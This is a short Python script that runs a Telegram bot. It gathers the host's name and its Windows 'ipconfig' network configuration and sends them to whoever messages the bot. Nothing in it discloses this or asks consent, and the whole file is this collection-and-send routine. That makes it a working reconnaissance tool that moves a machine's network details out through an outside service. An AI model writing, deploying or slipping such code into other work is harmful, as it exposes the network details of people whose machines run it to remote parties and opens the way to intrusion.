# import some libraries
import telebot
import subprocess
import socket
name = socket.gethostname()

token = '' #BotFather's token
bot = telebot.TeleBot(token) #creating bot

output = subprocess.check_output(['ipconfig']) #console text with command ipconfig


try:
    output = output.decode('utf-8') #uncoding utf-8
except UnicodeDecodeError:
    try:
        output = output.decode('ascii') #uncoding ascii
    except UnicodeDecodeError:
        try:
            output = output.decode('cp866') #uncoding cp866

        except UnicodeDecodeError:
            pass
file = 'Name: ' + name + '\n' + output
@bot.message_handler()
def start_message(message): #bot send message
    bot.send_message(message.chat.id, file)
bot.infinity_polling()